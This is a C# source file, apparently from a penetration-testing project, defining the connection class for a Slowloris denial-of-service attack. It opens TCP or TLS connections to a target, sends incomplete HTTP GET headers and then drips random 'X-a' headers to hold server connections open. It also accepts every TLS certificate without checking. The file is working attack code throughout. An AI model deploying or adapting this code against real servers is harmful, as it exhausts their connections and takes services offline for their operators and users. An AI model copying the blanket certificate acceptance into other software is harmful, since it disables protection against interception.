using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;

namespace Savaged.PenTesting.DOS
{
    public class SlowLorisConnection
    {
        private const string _userAgent =
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0";
        private static Random _rnd = new Random();
        private StreamWriter _writer;
        private TcpClient _client;

        public string IP { get; }
        public int Port { get; }
        public bool UsingSsl { get; }
        public int ID { get; }
        public bool IsOpen { get; private set; }

        public SlowLorisConnection(string ip, int port, bool useSsl)
        {
            ID = SlowLoris.MAX_CONNECTIONS + 1;
            IP = ip;
            Port = port;
            UsingSsl = useSsl;
            _client = new TcpClient();
        }

        public SlowLorisConnection(string ip, int port, bool useSsl, int id)
            : this(ip, port, useSsl)
        {
            ID = id;
        }

        public SlowLorisConnection Clone(int id)
        {
            var value = new SlowLorisConnection(IP, Port, UsingSsl, id);
            return value;
        }

        public void Open()
        {
            if (!IsOpen)
            {
                if (!_client.Connected)
                {
                    _client.Connect(IP, Port);
                }
                if (UsingSsl)
                {
                    var ssl = new SslStream(
                        _client.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateCert));
                    _writer = new StreamWriter(ssl);
                }
                else
                {
                    _writer = new StreamWriter(_client.GetStream());
                }
                IsOpen = true;

                SendHeaders();
            }
        }

        private void SendHeaders()
        {
            if (!IsOpen)
            {
                throw new InvalidOperationException(
                    "The connection must be opened first!");
            }
            _writer?.WriteLine(
                string.Format("GET /?{0} HTTP/1.1\r\n", _rnd.Next(0, 2000)));
            _writer?.WriteLine(string.Format("{0}\r\n", _userAgent));
            _writer?.WriteLine("Accept-language: en-US,en,q=0.5\r\n");
            _writer?.Flush();
        }

        public void KeepAlive()
        {
            if (!IsOpen)
            {
                throw new InvalidOperationException(
                    "The connection must be opened first!");
            }
            _writer?.WriteLine(string.Format("X-a: {0}\r\n", _rnd.Next(1, 5000)));
            _writer?.Flush();
        }

        public static bool ValidateCert(
            object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
            return true; // Allow untrusted certificates.
        }

        public void Close()
        {
            _writer?.Close();
            _client.Close();
            IsOpen = false;
        }

        public override string ToString()
        {
            var value = 
                $"ID: {ID}, IP: {IP}, Port: {Port}, UsingSsl: {UsingSsl}";
            return value;
        }

    }
}

